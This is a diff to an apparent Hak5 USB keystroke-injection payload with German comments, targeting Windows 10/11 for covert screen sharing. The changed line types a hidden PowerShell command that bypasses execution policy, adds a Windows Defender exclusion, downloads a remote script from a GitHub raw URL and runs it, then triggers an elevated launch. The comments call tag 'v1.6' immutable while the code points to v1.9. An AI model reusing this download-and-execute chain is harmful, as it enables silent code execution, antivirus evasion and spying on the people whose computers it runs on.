@@ -10,7 +10,7 @@ REM     Beim Start oeffnet das ps1 ein CMD-Fenster mit der Aufruf-URL.
 
 REM     Target: Windows 10/11
 
-REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.8/s.ps1
+REM     Payload: https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.9/s.ps1
 REM     (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1,
 REM      spart 23 Zeichen im 259-Zeichen-Limit)
 REM     Der Tag 'v1.6' ist ABSCHLIESSEND (immutable): der Inhalt dahinter
@@ -62,7 +62,7 @@ REM       * Administratorrechte (Firewall, URL-Reservation, Defender-Ausnahme)
 
 GUI r
 DELAY 1200
-STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.8/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
+STRING powershell -ExecutionPolicy Bypass -w h -c md C:\PS -Force;Add-MpPreference -ExclusionPath 'C:\PS';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.9/s.ps1 -OutFile C:\PS\x.ps1;& C:\PS\x.ps1
 DELAY 800
 CTRL-SHIFT ENTER
 DELAY 3000
